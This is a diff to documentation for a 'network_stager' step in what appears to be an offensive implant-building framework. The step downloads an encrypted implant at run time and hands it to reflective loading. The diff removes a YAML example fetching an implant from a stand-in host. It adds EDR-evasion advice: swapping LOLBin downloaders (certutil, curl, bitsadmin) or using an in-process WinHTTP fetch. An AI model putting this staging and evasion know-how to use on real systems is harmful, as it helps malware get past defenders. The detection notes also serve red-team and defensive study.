@@ -3,49 +3,12 @@
 *Fetches the payload over the network at run time instead of embedding it, so
 nothing of it ships in the artifact and the operator can rotate it freely.*
 
-## Metadata
-
-| | |
-|---|---|
-| **ATT&CK** | T1105, T1071 |
-| **Stability** | experimental (compile-verified; the `scp://` transport is not runtime-verified) |
-| **Category** | Control |
-| **YAML key** | `network_stager` |
-
 ## What it does
 
 Fetches a payload over the network at **run time** instead of embedding it in the
 artifact. The step downloads the bytes, optionally decrypts them, and hands them
 to the next Execution step, which runs them exactly as it would an embedded
 payload.
-
-## YAML parameters
-
-| field | type | default | notes |
-| --- | --- | --- | --- |
-| `payload` | string | *(required)* | name in `build.payloads` this step stages; must also be loaded by a later Execution step |
-| `url` | string | *(required)* | the URL; the scheme picks the transport (`http://`/`https://`/`ftp://` → `certutil`, `scp://` → `scp`) |
-| `crypto` | `none` \| `xchacha20poly1305` | `none` | whether the fetched blob is encrypted |
-| `key` | string (hex) | — | 32-byte key; required when `crypto` is not `none` |
-| `nonce` | string (hex) | — | 24-byte nonce; required when `crypto` is not `none` |
-| `timeout_ms` | integer | `30000` | connect/read timeout |
-| `retries` | integer | `0` | extra attempts after the first |
-
-## YAML example
-
-```yaml
-runtime:
-  - technique: network_stager
-    params:
-      payload: implant
-      url: "https://example.invalid/implant.bin"
-      crypto: xchacha20poly1305
-      key: "…64 hex chars…"
-      nonce: "…48 hex chars…"
-  - technique: reflective_loading
-    params:
-      payload: implant
-```
 
 ## How it works
 
@@ -80,6 +43,12 @@ sequenceDiagram
 3. The bytes are stored in a process-global slot; the next Execution step reads
    that slot instead of decrypting an embedded payload.
 
+## Integration
+
+A **Control** step: it orchestrates the chain and returns control when it
+finishes, so the steps around it keep running. It fetches the payload at run time and hands it to the following
+Execution step.
+
 ## What it evades
 
 - **The payload never ships in the artifact**, so there is no embedded ciphertext
@@ -91,8 +60,12 @@ sequenceDiagram
 
 ## What detects it
 
-- The child process (`certutil`/`scp`) and its command line are observable by EDR
-  and are themselves a LOLBin-detection signal.
+- The child process (`certutil`/`curl`/`scp`/`powershell`/`bitsadmin`) and its
+  command line are observable by EDR and are themselves a LOLBin-detection
+  signal. Many EDRs block `certutil -urlcache` downloads outright (an `access
+  denied` on the spawn); the `downloader` parameter exists to switch to one the
+  host allows. The robust answer is an in-process fetch (WinHTTP), which never
+  spawns a child — see `docs/design/network-stager.md`.
 - The artifact gains no static network imports (the fetch is a subprocess), but
   the runtime download is a network connection an NDR/EDR can see.
 - A temp file is written to disk between download and execution (an in-memory
